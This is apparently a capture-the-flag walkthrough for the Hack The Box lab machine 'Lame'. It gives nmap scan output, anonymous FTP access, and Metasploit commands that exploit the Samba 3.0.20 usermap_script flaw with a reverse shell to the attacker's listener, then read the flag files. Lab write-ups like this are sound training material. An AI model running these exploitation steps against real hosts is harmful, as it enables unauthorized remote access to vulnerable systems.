---
description: 10.10.10.3
---

# Lame

Tags
* samba

<!--

Required tools
* nmap

Other commands/tools
```
metasploit
```

-->

## Walkthrough

* [Lame Writeup](https://coldfusionx.github.io/posts/LameHTB)

```bash
nmap -sC -sV -oA nmap.out 10.10.10.3

# output
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m20s, deviation: 2h49m44s, median: 18s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: <REDACTED>
```

Access FTP server
```bash
# ftp clients
apt install ftp ncftp lftp

# anonymous access
lftp 10.10.10.3
```

### Exploitation

With Metasploit
```bash
searchsploit samba
# output
Samba 3.0.20 < 3.0.25rc3 - 'Username' map scr | unix/remote/16320.rb

# start console
msfconsole
# search exploits
search samba

# select exploit
info exploit/multi/samba/usermap_script
use exploit/multi/samba/usermap_script

set RHOSTS 10.10.10.3
set RPORT 445
set LHOST tun0
set LPORT 4444
exploit

python -c 'import pty; pty.spawn("/bin/bash")'

cat /home/makis/user.txt
cat /root/root.txt
```

Manually

> TODO
